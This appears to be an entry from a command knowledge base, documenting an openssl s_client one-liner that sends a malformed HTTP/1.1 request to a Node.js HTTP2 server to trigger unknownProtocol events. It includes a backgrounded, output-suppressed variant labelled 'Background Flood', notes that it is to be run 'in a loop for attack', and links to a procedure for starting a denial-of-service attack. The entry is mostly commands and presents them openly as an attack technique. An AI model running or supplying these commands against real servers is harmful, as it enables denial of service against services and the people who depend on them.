---
id: cmd-002
data: 'echo $request | openssl s_client -connect 127.0.0.1:50000 > /dev/null 2>&1 &'
tags:
  - dos
  - openssl
  - exploit
type: command
output: No visible output due to redirection; server logs unknownProtocol event
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:36.709Z'
verified: false
validated: true
submitted: true
---
# send-malformed-http-request

## Command

```bash
echo $request | openssl s_client -connect 127.0.0.1:50000 > /dev/null 2>&1 &
```

## Description

Sends a malformed HTTP/1.1 request over SSL to trigger unknownProtocol in a Node.js HTTP2 server, run in background for flooding.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$request` | The HTTP request string (e.g., 'GET / HTTP/1.1\r\nHost: Anything\r\n\r\n') | Yes |
| `-connect` | Target host:port | Yes |
| `&` | Background execution | No |
| `> /dev/null 2>&1` | Suppress output | No |

## Examples

### Basic Usage

```bash
echo 'GET / HTTP/1.1\r\nHost: test\r\n\r\n' | openssl s_client -connect 127.0.0.1:50000
```

### Advanced Usage (Background Flood)

```bash
echo $request | openssl s_client -connect 127.0.0.1:50000 > /dev/null 2>&1 &
```

In a loop for attack.

## Expected Output

Silent due to redirection; check server for 'unknownProtocol' logs.

## Related

- [[commands/monitor-file-descriptors]]
- [[procedures/Initiate-DoS-Attack-with-OpenSSL-Client]]
